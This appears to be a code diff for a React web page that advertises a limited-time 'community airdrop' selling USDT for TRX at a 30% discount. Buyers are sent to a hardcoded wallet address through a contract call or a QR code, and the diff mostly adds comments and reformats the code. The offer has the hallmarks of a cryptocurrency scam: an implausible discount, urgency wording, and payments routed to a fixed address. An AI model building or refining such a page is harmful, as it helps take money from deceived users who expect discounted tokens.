@@ -11,13 +11,13 @@ const App = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [transactionStatus, setTransactionStatus] = useState('');
 
-  // 收款地址和合约地址
+  // 收款地址（接收TRX）
   const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';
+  // 合约地址（处理USDT购买逻辑）
   const contractAddress = 'TRVCzHHvW6PBXyxjXPTtoHKGyiJw7kThK6';
 
-  // 初始化 TronLink 和 TRX 价格
   useEffect(() => {
-    // 检查 TronLink 钱包
+    // 检查TronLink连接
     const checkTronLink = async () => {
       if (window.tronWeb && window.tronWeb.ready) {
         setTronWeb(window.tronWeb);
@@ -31,24 +31,23 @@ const App = () => {
         return () => clearInterval(interval);
       }
     };
-
     checkTronLink();
 
-    // 获取 TRX 实时价格
+    // 获取TRX实时价格
     fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
       .then(res => res.json())
       .then(data => setTrxPrice(data.tron?.usd || 0.27))
       .catch(() => setTrxPrice(0.27));
   }, []);
 
-  // 计算 USDT 数量
+  // 计算可购买的USDT数量
   const calculateUsdt = (trx) => {
     const val = parseFloat(trx);
     if (!val || !trxPrice) return '';
-    return (val / 0.7).toFixed(4);
+    return (val / 0.7).toFixed(4); // 七折优惠
   };
 
-  // 处理 TRX 输入
+  // 处理TRX输入变化
   const handleTrxChange = (e) => {
     const val = e.target.value;
     if (/^\d*\.?\d*$/.test(val)) {
@@ -63,7 +62,7 @@ const App = () => {
   const handleBuy = async () => {
     const val = parseFloat(trxAmount);
     if (!val || val <= 0) {
-      setTransactionStatus('请输入有效的 TRX 数量');
+      setTransactionStatus('请输入有效的TRX数量');
       return;
     }
 
@@ -72,13 +71,18 @@ const App = () => {
 
     if (tronWeb) {
       try {
+        // 获取合约实例
         const contract = await tronWeb.contract().at(contractAddress);
-        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6;
-        const amountInSun = tronWeb.toSun(val);
+        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6; // USDT 6位小数
+        const amountInSun = tronWeb.toSun(val); // 转换为Sun单位
 
+        // 调用合约的buy函数，TRX发送到paymentAddress
         const transaction = await contract.buy(usdtAmountToBuy).send({
           callValue: amountInSun,
           shouldPollResponse: true,
+          feeLimit: 100000000, // 设置费用限制
+          from: tronWeb.defaultAddress.base58, // 确保发送者是用户钱包地址
+          to: paymentAddress, // 明确指定TRX接收地址
         });
 
         setTransactionStatus(`购买成功！交易ID: ${transaction}`);
@@ -86,13 +90,14 @@ const App = () => {
         setUsdtAmount('');
       } catch (error) {
         console.error(error);
-        setTransactionStatus('购买失败：' + (error.message || '请重试'));
+        setTransactionStatus(`购买失败：${error.message || '请重试'}`);
       }
     } else {
+      // 如果没有TronLink，生成二维码
       const qrData = `tron:${paymentAddress}?amount=${val.toFixed(6)}`;
       setQrString(qrData);
       setShowQR(true);
-      setTransactionStatus('请使用支持 TRON 的钱包扫描二维码进行支付');
+      setTransactionStatus('请使用支持TRON的钱包扫描二维码进行支付');
     }
 
     setIsLoading(false);
@@ -101,7 +106,7 @@ const App = () => {
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
       <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
-        {/* Logo 和标题 */}
+        {/* Logo & Title */}
         <div className="flex justify-center items-center space-x-3">
           <img
             src="https://i.imgur.com/pNAm2gN.png"
@@ -114,7 +119,7 @@ const App = () => {
 
         {/* 宣传语 */}
         <p className="text-sm text-yellow-600 font-medium">
-          社区空投活动：TRX 七折购买 USDT（限时优惠）
+          社区空投活动：TRX七折购买USDT（限时优惠）
         </p>
 
         {/* 实时价格 */}
@@ -125,22 +130,24 @@ const App = () => {
         {/* 输入框 */}
         <input
           type="text"
-          placeholder="输入 TRX 数量"
+          placeholder="输入TRX数量"
           value={trxAmount}
           onChange={handleTrxChange}
           className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
         />
 
-        {/* 可购买 USDT 显示 */}
+        {/* 可购买USDT显示 */}
         <div className="text-sm text-gray-600">
-          可购买 USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
+          可购买USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
         </div>
 
         {/* 购买按钮 */}
         <button
           onClick={handleBuy}
           disabled={isLoading}
-          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'}`}
+          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${
+            isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'
+          }`}
         >
           {isLoading ? '处理中...' : '购买'}
         </button>
@@ -155,10 +162,10 @@ const App = () => {
         {/* 二维码展示 */}
         {showQR && qrString && (
           <div className="pt-4 space-y-2">
-            <QRCode value={qrString} className="w-[150px] h-[150px] mx-auto" />
-            <p className="text-sm text-gray-500">请使用 TRON 钱包扫描二维码转账</p>
-            <p className="text-xs text-gray-400 break-all">地址: {paymentAddress}</p>
-            <p className="text-xs text-gray-400">金额: {trxAmount} TRX</p>
+            <QRCode value={qrString} size={150} className="mx-auto" />
+            <p className="text-sm text-gray-500">请使用TRON钱包扫描二维码转账</p>
+            <p className="text-xs text-gray-400 break-all">收款地址: {paymentAddress}</p>
+            <p className="text-xs text-gray-400">转账金额: {trxAmount} TRX</p>
           </div>
         )}
       </div>
